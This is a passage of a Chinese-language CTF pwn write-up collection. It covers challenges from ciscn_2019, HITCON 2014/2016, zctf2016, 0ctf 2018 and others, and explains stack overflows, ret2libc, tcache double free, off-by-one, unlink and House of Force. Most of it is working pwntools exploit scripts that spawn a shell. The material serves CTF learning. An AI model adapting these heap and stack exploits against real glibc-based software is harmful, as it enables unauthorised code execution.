语句的时候会发现，返回地址位于 0xffca41dc，而我们写入的数据位于 0xffca41c0，相差 0x1c，因此还需要考虑该偏移量。\nru(\u0026#39;crash:\u0026#39;) ss = int(ru(\u0026#39;\\n\u0026#39;),16) leak(\u0026#39;ss\u0026#39;,ss) payload = \u0026#39;crashme\\x00\u0026#39;.ljust(26,\u0026#39;\\x00\u0026#39;) + p32(ss-0x1c) + asm(shellcraft.sh()) sl(payload) ciscn_2019_ne_5 # 本题有 GetFlag 的后门，有一个 memcpy 的操作，此时需要关注的偏移实际上是 dest 到 ebp 的距离。管理员密码可直接通过反编译得到。\nbinsh = 0x80482ea sla(\u0026#39;password:\u0026#39;,\u0026#39;administrator\u0026#39;) sla(\u0026#39;Exit\\n:\u0026#39;,\u0026#39;1\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x48+4),elf.plt[\u0026#39;system\u0026#39;],\u0026#39;a\u0026#39;*4,binsh) sla(\u0026#39;info:\u0026#39;,payload) sla(\u0026#39;Exit\\n:\u0026#39;,\u0026#39;4\u0026#39;) [HarekazeCTF2019]baby_rop2 # 题目给定了 libc，结合题目名可以想到 ret2libc，这里只能调用 printf 来打印函数 GOT 地址，其余和常规 ret2libc 相同。\npop_rdi = 0x400733 payload = flat(\u0026#39;a\u0026#39;*0x28,pop_rdi,elf.got[\u0026#39;read\u0026#39;],elf.plt[\u0026#39;printf\u0026#39;],elf.sym[\u0026#39;main\u0026#39;]) sla(\u0026#39;name?\u0026#39;, payload) ru(\u0026#39;\\n\u0026#39;) read = uu64(r(6)) leak(\u0026#39;read\u0026#39;, read) system, binsh = ret2libc(read,\u0026#39;read\u0026#39;,\u0026#39;./libc.so.6\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x28,pop_rdi,binsh,system,\u0026#39;a\u0026#39;*8) sla(\u0026#39;name?\u0026#39;, payload) ciscn_2019_n_5 # 本题没有开启任何保护，因此方法多样，例如 ret2libc：\nsla(\u0026#39;name\\n\u0026#39;, \u0026#39;merc\u0026#39;) pop_rdi = 0x400713 #ret = 0x4004c9 payload = flat(\u0026#39;a\u0026#39;*0x28,pop_rdi,elf.got[\u0026#39;read\u0026#39;],elf.plt[\u0026#39;puts\u0026#39;],elf.sym[\u0026#39;main\u0026#39;]) ru(\u0026#39;me?\\n\u0026#39;) sl(payload) read = uu64(r(6)) leak(\u0026#39;read\u0026#39;,read) sla(\u0026#39;name\\n\u0026#39;, \u0026#39;merc\u0026#39;) system, binsh = ret2libc(read,\u0026#39;read\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x28,pop_rdi,binsh,system,\u0026#39;a\u0026#39;*8) sla(\u0026#39;me?\\n\u0026#39;, payload) 或者更简单的 ret2shellcode：\nsla(\u0026#39;name\\n\u0026#39;, asm(shellcraft.sh())) payload = flat(\u0026#39;a\u0026#39;*0x28,0x601080) ru(\u0026#39;me?\\n\u0026#39;) sl(payload) 由于远程 libc 版本和本地二进制文件的版本不同，打远程时推荐使用 ret2shellcode，感觉这个更接近预期解。\nciscn_2019_final_3 # 提供了 libc，发现是 2.27 版本的，考虑和 tcache 利用有关。\n程序提供了 add 和 remove 两个功能，首先 add 只能创建小于 0x78 字节的 chunk，且最多创建 0x18 个 chunk。gift 会返回分配到的内存地址。而在 remove 中，free 之后没有将指针置 null，存在 double free。\n由于题目给了 libc，我们希望能泄露 libc 地址，这就需要 tcache 中某节点的 fd 指向 libc。而我们知道，unsorted bin 指向 main_arena 的指针是指向 libc 的，那么能不能把这个指针给 tcache 中某节点的 fd 呢？\n由于 0x78 字节的限制我们无法直接创建适合放入 unsorted bin 中的 chunk，因此需要先合并小堆块，然后修改 chunk0 的 chunk_size 把他变成一个大堆块。那么如何修改这个 chunk_size 字段？这就需要用到 double free，假设我们连续申请堆块申请到了 chunk11：\nchunk0 = add(0x78) add(0x18) for i in range(10): add(0x78) 注：第二次分配了 0x18 字节是 64 位下最小分配大小。这个 chunk1 的分配是为了让 unsorted bin 与 tcache 错位。\n那么这时连续两次 free 掉 chunk11，再 add 回来，使得 chunk11-\u0026gt;fd = chunk0-0x10，那么我们就在 chunk0-0x10 处伪造了一个堆块，再次 add 就会分配到 chunk0-0x10，此时填入准备好的 prev_size 及 chunk_size 即可修改 chunk0 大小。注意为了确保释放后进入 unsorted bin，chunk_size 需大于 0x400 字节。\nremove(11) remove(11) add(0x78,p64(chunk0-0x10)) # chunk11-\u0026gt;fd = chunk0-0x10 add(0x78,p64(chunk0-0x10)) add(0x78,p64(0)+p64(0x4a1)) 随后我们释放 chunk0 就会进入 unsorted bin，而释放 chunk1 会进入 tcache[0]。此时 add 就会得到 chunk0，并使得 chunk1-\u0026gt;fd = main_arena，那么接下来一次 add 得到 chunk1，下一次 add 得到 main_arena，减去偏移量即 libc 基址。\nremove(0) # unsorted bin remove(1) # tcache[0] add(0x78) # chunk0; chunk1-\u0026gt;fd = main_arena add(0x18) # chunk1 main_arena = add(0x18) base = main_arena - 0x3ebca0 leak(\u0026#39;base\u0026#39;, base) 最后再次利用 double free，用 one_gadget 覆盖 free_hook，再次调用 remove 即可。\nlibc = ELF(\u0026#39;./libc.so.6\u0026#39;) free_hook = base + libc.sym[\u0026#39;__free_hook\u0026#39;] one_gadget = base + 0x10a38c add(0x28) remove(18) remove(18) add(0x28, p64(free_hook)) add(0x28, p64(free_hook)) add(0x28, p64(one_gadget)) remove(0) ciscn_2019_es_2 # 只能溢出 8 字节，空间太小，因此考虑栈迁移。如下布置栈：\nret addr ebp-0x2c padding /sh\\x00 /bin ebp-0x1c padding system padding ebp-0x24 padding padding 得到：\nsa(\u0026#39;name?\\n\u0026#39;,\u0026#39;a\u0026#39;*0x28) ru(\u0026#39;a\u0026#39;*0x28) ebp = uu32(r(4)) leak(\u0026#39;ebp\u0026#39;, ebp) payload = flat(\u0026#39;a\u0026#39;*8,ebp-0x24,\u0026#39;a\u0026#39;*4,elf.plt[\u0026#39;system\u0026#39;],\u0026#39;a\u0026#39;*4,ebp-0x1c,\u0026#39;/bin/sh\\x00\u0026#39;,\u0026#39;a\u0026#39;*4,ebp-0x2c) s(payload) roarctf_2019_easy_pwn # 本题在 write 时存在 off_by_one 漏洞：\n__int64 __fastcall sub_E26(signed int a1, unsigned int a2) { __int64 result; // rax if (a1\u0026gt; (signed int)a2 ) return a2; if (a2 - a1 == 10) LODWORD(result) = a1 + 1; else LODWORD(result) = a1; return (unsigned int)result; } 如果编辑时输入的 size 比创建时的 size 大 10，就可以多输入一个字节。这多出来的一个字节可以覆盖到下一个 chunk 的 chunk_size 字段，从而修改其大小，造成堆块重叠。\n首先连续创建 5 个 chunk，其中第 0 个的大小必须以 8 结尾，否则只能溢出到 prev_size 而不是 chunk_size。编辑 0 中数据，触发 off_by_one 条件溢出修改 1 的大小。随后 free(1) 使其对应大小的 chunk 进入 unsorted bin，此时 2 的 fd 即指向 main_arena+88，从而可以泄露 libc。\nadd(0x58) # 0 for i in range(4): add(0x60) # 1 edit(0, 0x58+10,\u0026#39;a\u0026#39;*0x58+\u0026#39;\\xe1\u0026#39;) delete(1) add(0x60) # 1 show(2) # 2 ru(\u0026#39;content:\u0026#39;) main_arena = uu64(r(6)) - 88 base = main_arena - libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x10 leak(\u0026#39;base\u0026#39;, base) 接下来先绕过 fastbin 的大小检查，随后向 fd 写入 malloc_hook 上方的地址后申请回来，从申请到的地址出发填充 11 字节后即可用 one_gadget 覆盖 __malloc_hook。但是需要注意的是 one_gadget 的约束条件得不到满足，因此需要先执行 __libc_realloc 对 rsp 进行调整。最后用 one_gadget 覆盖 __realloc_hook。\nadd(0x60) # 5 (2) delete(2) # bypass fastbin check edit(5,0x8,p64(main_arena-0x33)) # above malloc_hook add(0x60) # 2 add(0x60) # 6 payload = flat(\u0026#39;a\u0026#39;*0xb,base+0x4526a,base+libc.sym[\u0026#39;realloc\u0026#39;]+2) edit(6,len(payload),payload) add(0x18) ciscn_2019_n_3 # 本题 do_new 函数先创建 0xc 的 chunk，包含填充的数字、对数字的打印函数和释放函数；而如果申请的是 string 类型，且长度不超过 0x400 的话，随后还会创建一个新的 chunk，包含字符串内容、对字符串的打印函数和释放函数。\n而在 do_del 中，free 后没有清空指针，存在 uaf。因此可以先申请两个堆块（总大小大于 0xc）然后依次释放，再申请一个大小为 0xc 的堆块。那么此时先会拿出 chunk1 的 0xc 这一块，再拿出 chunk0 的 0xc 这一块，后者是我们可写的。\n通过逆向可知结构体偏移 0 处是打印函数、偏移 4 处是释放函数，释放函数的参数是结构体指针本身。那么我们将 chunk0 的打印函数写成 sh\\x00\\x00（注意 4 字节），释放函数用 system 覆盖，释放时就会执行 system(\u0026quot;sh\u0026quot;)。\ndef add(index,len,content=\u0026#39;a\u0026#39;): sla(\u0026#39;CNote\u0026gt; \u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;Index\u0026gt; \u0026#39;,str(index)) sla(\u0026#39;Type\u0026gt; \u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;Length\u0026gt; \u0026#39;,str(len)) sla(\u0026#39;Value\u0026gt; \u0026#39;,content) def delete(index): sla(\u0026#39;CNote\u0026gt; \u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;Index\u0026gt; \u0026#39;,str(index)) add(0,0x10) add(1,0x10) delete(0) delete(1) add(2,0xc,\u0026#39;sh\\x00\\x00\u0026#39;+p32(elf.sym[\u0026#39;system\u0026#39;])) # 0xc from 1, then 0xc from 0 delete(0) hitcon2014_stkof # 本题共四个功能：添加、读入内容、删除、显示。其中读入内容存在堆溢出，我们可以利用这个溢出实现 unlink 攻击。程序中存在全局数组 bag，存放所有 chunk 的 mem 指针。\n先申请 3 个 chunk，其中第 1 个 chunk 没有用，只是因为前两个 chunk 不连续所以才申请的。随后通过 chunk2 溢出到 chunk3 进行 unlink 攻击，这样修改 bag[2] 等价于修改 bag[-1]，填充掉 bag[-1] 和 bag[0] 后，令：\nbag[1] = elf.got['free'] bag[2] = elf.got['fflush']，fflush 可以是任意已调用的 libc 函数 bag[3] = elf.got['atoi'] 此时我们 edit(1) 写入 elf.plt['puts'] 即可劫持 free 函数到 puts，那么调用 delete(2) 就会打印出 fflush 地址，从而泄露 libc。最后 edit(3) 写入 system 地址，劫持 atoi 到 system，这是因为在程序读入指令时会调用 atoi(\u0026amp;nptr)，我们输入的 nptr 只需要是 /bin/sh 即可 getshell。\ndef add(size): sl(\u0026#39;1\u0026#39;) sl(str(size)) ru(\u0026#39;OK\\n\u0026#39;) def delete(index): sl(\u0026#39;3\u0026#39;) sl(str(index)) def edit(index,content): sl(\u0026#39;2\u0026#39;) sl(str(index)) sl(str(len(content))) s(content) ru(\u0026#39;OK\\n\u0026#39;) bag = 0x602140 add(0x80) add(0x80) add(0x80) fd = bag+0x10-0x18 bk = bag+0x10-0x10 payload = flat(0,0x80,fd,bk).ljust(0x80,\u0026#39;a\u0026#39;) payload += flat(0x80,0x90) edit(2,payload) delete(3) # bag[2] \u0026lt;-\u0026gt; bag[-1] payload = flat(\u0026#39;a\u0026#39;*0x10,elf.got[\u0026#39;free\u0026#39;],elf.got[\u0026#39;fflush\u0026#39;],elf.got[\u0026#39;atoi\u0026#39;]) edit(2,payload) edit(1,p64(elf.plt[\u0026#39;puts\u0026#39;])) delete(2) # puts(GOT[fflush]) ru(\u0026#39;OK\\n\u0026#39;) fflush = uu64(r(6)) leak(\u0026#39;fflush\u0026#39;,fflush) system,binsh = ret2libc(fflush,\u0026#39;fflush\u0026#39;) edit(3,p64(system)) sl(\u0026#39;/bin/sh\\x00\u0026#39;) Part III # sleepyHolder_hitcon_2016 # 这道题允许保存 small/big/huge secret，其中 huge 只能保存一次，不能删除和修改，并且在保存了一个 small/big 之后就不能再保存新的 small/big 了，只能 renew。\n显然这个 huge 就是我们漏洞利用的核心。实际上，huge 的范围属于 large bin，在申请这么大的 chunk 时如果 unsorted bin 中没有满足条件的，就会触发 malloc_consolidate()，使 fastbin 中的 chunk 合并进入 unsorted bin，最终根据合并后的大小进入 small bin 或 large bin。那么我们不妨先申请一个 small，然后申请 big 防止 small 被释放时与 top chunk 合并，再释放 small。此时 small 进入 fastbin，再申请 huge 即可让 small 进入到 small bin。\n由于这时 small 已经不处于 fastbin 链表头了，所以再次释放并不会出错，造成 double free。这样之后在 small 内伪造 chunk 并 unlink 劫持 GOT 表即可。\nadd(1) add(2) delete(1) # 1-\u0026gt;fastbin add(3) # consolidate,1-\u0026gt;unsorted bin-\u0026gt;smallbin delete(1) small_secret = 0x6020d0 fd = small_secret - 0x18 bk = small_secret - 0x10 payload = flat(0,0x21,fd,bk,0x20) add(1,payload) delete(2) # ?,big,huge,small,big_flag,huge_flag,small_flag payload = flat(0,elf.got[\u0026#39;atoi\u0026#39;],elf.got[\u0026#39;puts\u0026#39;],elf.got[\u0026#39;free\u0026#39;]) + p32(1)*3 edit(1,payload) edit(1,p64(elf.plt[\u0026#39;puts\u0026#39;])) # free -\u0026gt; puts delete(2) atoi = uu64(r(6)) system,binsh = ret2libc(atoi,\u0026#39;atoi\u0026#39;) edit(1,p64(system)) add(2,\u0026#39;/bin/sh\\x00\u0026#39;) delete(2) secretHolder_hitcon_2016 # 类似上一题，不过 huge 可以修改和删除了。由于 huge 非常大，分配时会调用 mmap()，但是当释放掉 huge 再申请时，mmap_threshold 已经变得和 huge 一样大，此时分配 huge 使用的是 brk()，因此 huge 被分配到了堆上。\n利用这个特性，我们可以先令 small 和 huge 地址重合，随后在下面垫上 big。在 small 里伪造堆块并释放 big，触发 unlink，剩余的工作就和上一题一模一样了。\ndef add(type,content=\u0026#39;a\u0026#39;): sla(\u0026#39;Renew secret\\n\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;Huge secret\\n\u0026#39;,str(type)) sa(\u0026#39;: \\n\u0026#39;,content) def delete(type): sla(\u0026#39;Renew secret\\n\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;Huge secret\\n\u0026#39;,str(type)) def edit(type,content): sla(\u0026#39;Renew secret\\n\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;Huge secret\u0026#39;,str(type)) sa(\u0026#39;: \\n\u0026#39;,content) add(1) add(2) delete(1) delete(2) add(3) delete(3) # mmap threshold +++ add(3) # brk() delete(1) add(1) # small \u0026lt;-\u0026gt; huge add(2) small = 0x6020b0 fd = small-0x18 bk = small-0x10 payload = flat(0,0x21,fd,bk,0x20,0x90,\u0026#39;a\u0026#39;*0x80) payload += flat(0,0x21,\u0026#39;a\u0026#39;*0x10,0,0x21) edit(3,payload) delete(2) # ?,big,huge,small,big_flag,huge_flag,small_flag payload = flat(0,elf.got[\u0026#39;atoi\u0026#39;],elf.got[\u0026#39;puts\u0026#39;],elf.got[\u0026#39;free\u0026#39;]) + p32(1)*3 edit(1,payload) edit(1,p64(elf.plt[\u0026#39;puts\u0026#39;])) # free -\u0026gt; puts delete(2) atoi = uu64(r(6)) system,binsh = ret2libc(atoi,\u0026#39;atoi\u0026#39;) edit(1,p64(system)) add(2,\u0026#39;/bin/sh\\x00\u0026#39;) delete(2) bcloud_bctf_2016 # 在读入名字和读入 Org 以及 Host 时，均存在同样的 strcpy 漏洞，前者导致泄露堆地址，而后者允许我们 off-by-one 修改 top chunk 的大小，从而实现 House of Force。通过 gdb 调试得到 top_chunk = heap + 0xd0，那么构造的 evil_size 就是我们想分配到的 note_len 数组地址减去 header 的 0x8，减去 old_top_chunk 地址，再减去 12，这是因为已经分配了三个堆块，在程序中每个堆块额外分配了 4B。最后从 note_len 覆盖到 note 数组，劫持 free 到 printf 泄露 libc，再劫持 atoi 到 system。\ndef add(len,content=\u0026#39;a\u0026#39;): sla(\u0026#39;\u0026gt;\u0026gt;\\n\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(len)) sa(\u0026#39;:\\n\u0026#39;,content) def delete(index): sla(\u0026#39;\u0026gt;\u0026gt;\\n\u0026#39;,\u0026#39;4\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(index)) def edit(index,content): sla(\u0026#39;\u0026gt;\u0026gt;\\n\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;:\\n\u0026#39;,str(index)) sla(\u0026#39;:\\n\u0026#39;,content) sa(\u0026#39;name:\\n\u0026#39;,\u0026#39;a\u0026#39;*0x40) ru(\u0026#39;a\u0026#39;*0x40) heap = uu32(r(4)) leak(\u0026#39;heap\u0026#39;,heap) sa(\u0026#39;Org:\\n\u0026#39;,\u0026#39;a\u0026#39;*0x40) sla(\u0026#39;Host:\\n\u0026#39;,p32(0xffffffff)) note_len = 0x804b0a0 note = 0x804b120 top_chunk = heap + 0xd0 evil_size = note_len-0x8-top_chunk-0xc # gdb add(evil_size,\u0026#39;\u0026#39;) payload = flat((note-note_len)*\u0026#39;a\u0026#39;,elf.got[\u0026#39;atoi\u0026#39;],elf.got[\u0026#39;free\u0026#39;],elf.got[\u0026#39;atoi\u0026#39;]) add(len(payload),payload) edit(1,p32(elf.plt[\u0026#39;printf\u0026#39;])) delete(0) # printf(atoi.got) atoi = uu32(r(4)) system,binsh = ret2libc(atoi,\u0026#39;atoi\u0026#39;) edit(2,p32(system)) sla(\u0026#39;\u0026gt;\u0026gt;\\n\u0026#39;,\u0026#39;/bin/sh\\x00\u0026#39;) lctf2016_pwn200 # 首先不难发现读入 name 时存在 off-by-one，可以借此泄露栈地址。为了后面 ret2shellcode，我们可以先在 name 里顺便写好 shellcode：\npayload = asm(shellcraft.sh()).ljust(48,\u0026#39;a\u0026#39;) sa(\u0026#39;u?\\n\u0026#39;,payload) ru(payload) rbp = uu64(ru(\u0026#39;, w\u0026#39;,True)) leak(\u0026#39;rbp\u0026#39;,rbp) 而读入 money 时，恰好可以覆盖到堆指针 dest。那么可以覆盖 dest 为我们伪造的 chunk，同时准备好 id（只需要大于 0x10 小于 0x21000 即可）作为 nextsize，这样就可以先释放再申请这个 fake chunk，就可以控制 rip 了，最后覆盖 rip 为 shellcode 地址。\n通过 gdb 调试，可以绘制大致的栈结构图：\n------------ \u0026lt;- leaked rbp | | 0x20 ------------ \u0026lt;- rbp | shellcode | 0x30 ------------ \u0026lt;- shellcode_addr -- | 0x20 | id | ------------ | | | | ------------ | | rip | | 0x40 ------------ | | rbp | | ------------ | | dest | | ------------ \u0026lt;- fake -- | 0x41 | ------------ | prev_size | ------------ | ... | 由此可以得到：\nsc = rbp-0x50 fake = rbp-0x90 从而伪造堆块：\nsla(\u0026#39;id ~~?\\n\u0026#39;,str(0x20)) sa(\u0026#39;money~\\n\u0026#39;,p64(0)*4+flat(0,0x41,0,fake)) sla(\u0026#39;choice :\u0026#39;,\u0026#39;2\u0026#39;) # free sla(\u0026#39;choice :\u0026#39;,\u0026#39;1\u0026#39;) # malloc sla(\u0026#39;long?\u0026#39;,str(0x30)) # + 0x10 = 0x40 ru(\u0026#39;48\u0026#39;) sl(flat(\u0026#39;a\u0026#39;*0x18,sc)) sla(\u0026#39;choice :\u0026#39;,\u0026#39;3\u0026#39;) zctf2016_note2 # 添加 note 时，存在整数溢出漏洞，导致添加大小为 0 的 note，可以输入的长度为无符号的 -1，可以认为没有限制，但是 malloc 依旧会分配 0x20 字节。利用这个堆溢出，我们先分配三个 chunk：\n| ... | | ------------------- | | \u0026#39;a\u0026#39;*8 | | ------------------- \u0026lt;- ptr[2] chunk2 | size=0x91 | | ------------------- | | prev_size | | ------------------- \u0026lt;--------------- | | | ------------------- | | \u0026#39;a\u0026#39;*8 | | ------------------- \u0026lt;- ptr[1] chunk1 | size=0x20 | | ------------------- | | prev_size | | ------------------- \u0026lt;--------------- | | 0x18 | ------------------- | | bp_prev_size=0x60 | | ------------------- | | \u0026#39;a\u0026#39;*0x40 | 0x40 | ------------------- | | fd | bk | 0x10 | ------------------- chunk0 | fake_size=0x61 | | ------------------- | | fake_prev_size=0 | | ------------------- \u0026lt;- ptr[0] | | size=0x91 | | ------------------- | | prev_size | | ------------------- \u0026lt;--------------- 我们在 0x80 的 chunk0 内伪造了 0x61 的 chunk，并通过 bp_prev_size=0x60 确保能通过检查。随后分配大小为 0 的 chunk1（实际大小为 0x20），由于整数溢出这里可以输入无限长度的内容，最后分配 0x80 的 chunk2 用来引起 unlink。\n接下来释放 1 再拿回来，就可以溢出到 chunk2，修改其 prev_size 和 chunk_size，前者修改为 0x20+0x80=0xa0，后者置 PREV_IN_USE 位为 0。这样再释放 2 就可以 unlink 掉我们的 fake chunk 了。此时 ptr 指向 ptr-0x18，填充 0x18 字节后即可修改 ptr[0]，之后就是常规 GOT 劫持了。\ndef add(len,content=\u0026#39;a\u0026#39;*8): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;128)\u0026#39;,str(len)) sla(\u0026#39;content:\u0026#39;,content) def show(index): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;note:\u0026#39;,str(index)) def edit(index,choice,content): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;note:\u0026#39;,str(index)) sla(\u0026#39;]\u0026#39;,str(choice)) sl(content) def delete(index): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;4\u0026#39;) sla(\u0026#39;note:\u0026#39;,str(index)) sla(\u0026#39;name:\u0026#39;,\u0026#39;merc\u0026#39;) sla(\u0026#39;address:\u0026#39;,\u0026#39;privacy\u0026#39;) ptr = 0x602120 fd = ptr-0x18 bk = ptr-0x10 payload = flat(\u0026#39;a\u0026#39;*8,0x61,fd,bk,\u0026#39;a\u0026#39;*0x40,0x60) add(0x80,payload) # 0 add(0) # 1,0x20 add(0x80) # 2 delete(1) # padding,prev_size=0x20+0x80,PREV_IN_USE=0 add(0,flat(\u0026#39;a\u0026#39;*0x10,0xa0,0x90)) delete(2) payload = flat(\u0026#39;a\u0026#39;*0x18,elf.got[\u0026#39;atoi\u0026#39;]) edit(0,1,payload) show(0) ru(\u0026#39;is\u0026#39;) atoi = uu64(r(6)) system,binsh = ret2libc(atoi,\u0026#39;atoi\u0026#39;) edit(0,1,p64(system)) sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;/bin/sh\\x00\u0026#39;) zctf2016_note3 # 这题和上题类似，不过 bss 结构大致如下：\ncurrent_ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size 本题漏洞在于 edit 时会判断输入的长度是否小于 0，如果是就取相反数。但是可以通过整数溢出，输入 0x8000000000000000，它的相反数恰好是它自身，并且依然是一个负数（-1）。这样就造成数组越界，可以覆盖到 current_ptr。\n我们的思路是先让 current_ptr 指向 note3，然后利用越界覆盖一个 fake_chunk 到 note3 上，再释放 note4 触发 unlink，此时 note3_ptr 指向 note0_ptr，这样就可以实现 GOT 劫持。\n但是本题的 show 功能被禁用，而我们还需要泄露 libc 地址。这里用的方法是在 bss 段空余处写入 %llx.，然后把 free 先劫持到 printf，去打印这一段格式化字符串，相当于手动造了一个格式化字符串漏洞。这样就可以泄露栈上内容，从而泄露位于栈上的 __libc_start_main_ret 地址（一般位于偏移量 11 处）。最后泄露 libc 得到 system 地址，覆盖 atoi 即可。\ndef add(len,content=\u0026#39;a\u0026#39;*8): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;1024)\u0026#39;,str(len)) sla(\u0026#39;content:\u0026#39;,content) def show(index): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;2\u0026#39;) sla(\u0026#39;note:\u0026#39;,str(index)) def edit(index,content): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#39;note:\u0026#39;,str(index)) sla(\u0026#39;content:\u0026#39;,content) def delete(index): sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;4\u0026#39;) sla(\u0026#39;note:\u0026#39;,str(index)) negative = 0x8000000000000000 for i in range(8): add(0x200) edit(3,\u0026#39;a\u0026#39;) fd = 0x6020c8+0x8*3-0x18 bk = 0x6020c8+0x8*3-0x10 fake_chunk = flat(0,0x201,fd,bk).ljust(0x200,\u0026#39;a\u0026#39;) fake_chunk += flat(0x200,0x210) edit(-negative,fake_chunk) delete(4) edit(3,p64(elf.got[\u0026#39;free\u0026#39;])) edit(0,p64(elf.plt[\u0026#39;printf\u0026#39;])*2) bss_blank = 0x602100 edit(3,p64(bss_blank)) edit(0,\u0026#39;%llx.\u0026#39;*0x10) delete(0) lsmr = int(ru(\u0026#39;success\u0026#39;).split(\u0026#39;.\u0026#39;)[10],16) system,binsh = ret2libc(lsmr,\u0026#39;__libc_start_main_ret\u0026#39;) edit(3,p64(elf.got[\u0026#39;atoi\u0026#39;])) edit(0,p64(system)) sla(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,\u0026#39;/bin/sh\\x00\u0026#39;) 0ctf_2018_heapstorm2 # 分析先咕了，等完全理解了再补充。先放一些参考的 wp：\nwp1 wp2 wp3 def add(size): sl(\u0026#39;1\u0026#39;) ru(\u0026#39;Size:\u0026#39;) sl(\u0026#39;%d\u0026#39; % size) ru(\u0026#39;Command:\u0026#39;) def edit(index, content): sl(\u0026#39;2\u0026#39;) sla(\u0026#39;Index:\u0026#39;,str(index)) sla(\u0026#39;Size:\u0026#39;, str(len(content))) sa(\u0026#39;Content:\u0026#39;,content) ru(\u0026#39;Command:\u0026#39;) def free(index): sl(\u0026#39;3\u0026#39;) sla(\u0026#39;Index:\u0026#39;,str(index)) ru(\u0026#39;Command:\u0026#39;) def show(index): sl(\u0026#39;4\u0026#39;) sla(\u0026#39;Index:\u0026#39;, str(index)) m = ru(\u0026#39;Command:\u0026#39;) pos1 = m.find(\u0026#39;]: \u0026#39;) + len(\u0026#39;]: \u0026#39;) pos2 = m.find(\u0026#39;\\n1.\u0026#39;) return m[pos1:pos2] add(0x18) # 0 add(0x508) # 1 add(0x18) # 2 edit(1,flat(\u0026#39;a\u0026#39;*0x4f0,0x500)) add(0x18) # 3 add(0x508) # 4 add(0x18) # 5 edit(4,flat(\u0026#39;a\u0026#39;*0x4f0,0x500)) add(0x18) # 6 free(1) edit(0,\u0026#39;a\u0026#39;*(0x18-12)) add(0x18) # 1 add(0x4d8) # 7 free(1) free(2) add(0x38) # 1 add(0x4e8) # 2 free(4) edit(3,\u0026#39;a\u0026#39;*(0x18-12)) add(0x18) # 4 add(0x4d8) # 8 free(4) free(5) add(0x48) # 4 free(2) add(0x4e8) # 2 free(2) storage = 0x13370800 fake = storage-0x20 payload = flat(0,0,0,0x4f1,0,fake) edit(7,payload) payload = flat(0,0,0,0,0,0x4e1,0,fake+8,0,fake-0x18-5) edit(8,payload) try: add(0x48) except: print(\u0026#39;Try again?\u0026#39;) payload = flat(0,0,0,0,0,0x13377331,storage) edit(2,payload) payload = flat(0,0,0,0x13377331,storage,0x1000) p1 = payload + flat(storage-0x20+3,8) edit(0,p1) heap = uu64(show(1)) p2 = payload + flat(heap+0x10,8) edit(0,p2) base = uu64(show(1))-88-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 system = base + libc.sym[\u0026#39;system\u0026#39;] free_hook = base + libc.sym[\u0026#39;__free_hook\u0026#39;] p3 = payload + flat(free_hook,0x100,storage+0x50,0x100,\u0026#39;/bin/sh\\x00\u0026#39;) edit(0,p3) edit(1,p64(system)) sl(\u0026#39;3\u0026#39;) sla(\u0026#39;Index:\u0026#39;,\u0026#39;2\u0026#39;) houseoforange_hitcon_2016 # pwndbg\u0026gt; p *(struct _IO_FILE*)0x555b7d04b4f0 $2 = { _flags = 1852400175, _IO_read_ptr = 0x61 \u0026lt;error: Cannot access memory at address 0x61\u0026gt;, _IO_read_end = 0x0, _IO_read_base = 0x7f29a0f30510 \u0026#34;\u0026#34;, _IO_write_base = 0x2 \u0026lt;error: Cannot access memory at address 0x2\u0026gt;, _IO_write_ptr = 0x3 \u0026lt;error: Cannot access memory at address 0x3\u0026gt;, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 \u0026#39;\\000\u0026#39;, _shortbuf = \u0026#34;\u0026#34;, _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = \u0026#39;\\000\u0026#39; \u0026lt;repeats 19 times\u0026gt; } def add(size): sla(\u0026#39;choice :\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#34;:\u0026#34;,str(size)) sa(\u0026#39;:\u0026#39;,\u0026#39;a\u0026#39;*8) sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) def show(): sla(\u0026#39;choice :\u0026#39;,\u0026#39;2\u0026#39;) def edit(size,name): sla(\u0026#39;choice :\u0026#39;,\u0026#39;3\u0026#39;) sla(\u0026#34;:\u0026#34;,str(size)) sa(\u0026#39;:\u0026#39;,name) sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) sla(\u0026#39;:\u0026#39;,\u0026#39;1\u0026#39;) add(0x18) useless = flat(0,0x21,0x1f00000001,0) payload = \u0026#39;a\u0026#39;*0x10 + useless + flat(0,0xfa1) edit(0x40,payload) # 